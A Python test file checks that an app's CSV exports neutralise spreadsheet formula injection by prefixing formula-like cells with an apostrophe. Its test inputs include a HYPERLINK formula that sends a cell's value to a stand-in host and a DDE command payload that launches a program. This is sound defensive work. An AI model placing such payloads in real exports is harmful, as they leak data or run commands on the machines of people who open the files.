"""Every CSV export writes through one writer (app/core/utils/csv_safe.py):
text that starts like a formula gets an apostrophe; numbers, dates and the
exports' own cell formats are unchanged."""

import csv
import io
from datetime import date
from decimal import Decimal

import pytest

from app.core.utils import csv_safe


@pytest.mark.parametrize(
    "value, written",
    [
        (
            '=HYPERLINK("https://x.example/?"&B2,"click")',
            '\'=HYPERLINK("https://x.example/?"&B2,"click")',
        ),
        ("+cmd|' /C calc'!A0", "'+cmd|' /C calc'!A0"),
        ("-2+3", "'-2+3"),
        ("@SUM(A1:A9)", "'@SUM(A1:A9)"),
        ("\t=1+1", "'\t=1+1"),
        ("\r=1+1", "'\r=1+1"),
        ("+91 98765 43210", "'+91 98765 43210"),
        ("'=already", "'=already"),
        ("Asha Rao", "Asha Rao"),
        ("a=b", "a=b"),
        ("", ""),
    ],
)
def test_text_that_starts_like_a_formula_gets_an_apostrophe(value, written):
    assert csv_safe.cell(value) == written
    assert csv_safe.cell(csv_safe.cell(value)) == written  # never twice


@pytest.mark.parametrize(
    "value", [-12, 3.5, Decimal("-12.50"), date(2026, 11, 28), None, True]
)
def test_other_values_are_written_as_they_are(value):
    assert csv_safe.cell(value) is value


def test_a_formatted_amount_stays_a_number():
    assert csv_safe.cell(csv_safe.Number("-12.50")) == "-12.50"


def test_the_writer_matches_csv_writer_but_for_the_apostrophe():
    rows = [
        ["name", "amount", "when", "note"],
        ["=1+2", Decimal("-3.00"), date(2026, 1, 2), "line one\nline two"],
        ["Ravi, K", csv_safe.Number("-1.50"), "", None],
    ]
    plain, safe = io.StringIO(), io.StringIO()
    csv.writer(plain, lineterminator="\n").writerows(rows)
    csv_safe.writer(safe, lineterminator="\n").writerows(rows)
    assert safe.getvalue() == plain.getvalue().replace("=1+2", "'=1+2")
    assert list(csv.reader(io.StringIO(safe.getvalue())))[2] == [
        "Ravi, K",
        "-1.50",
        "",
        "",
    ]


async def test_the_waiting_list_export_neutralises_a_public_form_name(monkeypatch):
    """The waiting list's name and phone come from a public form."""
    from app.api.ticketing import waitlist

    async def rows(session, event):
        return [
            [
                '=HYPERLINK("https://x.example")',
                "a@b.co",
                "+1-(800)",
                "General",
                1,
                "waiting",
            ]
        ]

    monkeypatch.setattr(waitlist, "export_rows", rows)
    body = (await waitlist.export_csv(None, None)).decode()
    data = list(csv.reader(io.StringIO(body)))
    assert data[1][0] == '\'=HYPERLINK("https://x.example")'
    assert data[1][2] == "'+1-(800)"
    assert data[1][4] == "1"


async def test_the_contacts_export_neutralises_a_name(monkeypatch):
    from app.api.contacts import service

    async def rows(session, club_id, **kw):
        return [["@evil", "x@y.co", "", "attendee", True, "Meetup", None, None]]

    monkeypatch.setattr(service, "export_rows", rows)
    body = await service.export_csv(None, 1)
    data = list(csv.reader(io.StringIO(body)))
    assert data[1][:5] == ["'@evil", "x@y.co", "", "attendee", "yes"]


async def test_the_followers_export_neutralises_a_name(monkeypatch):
    from app.api.clubs import followers_insights

    async def rows(session, club_id, **kw):
        return [["-cmd", "user1", "", date(2026, 1, 1), 2, 1, "", "music", ""]]

    monkeypatch.setattr(followers_insights, "export_rows", rows)
    body = await followers_insights.export_csv(None, 1)
    data = list(csv.reader(io.StringIO(body)))
    assert data[1][:5] == ["'-cmd", "user1", "", "2026-01-01", "2"]
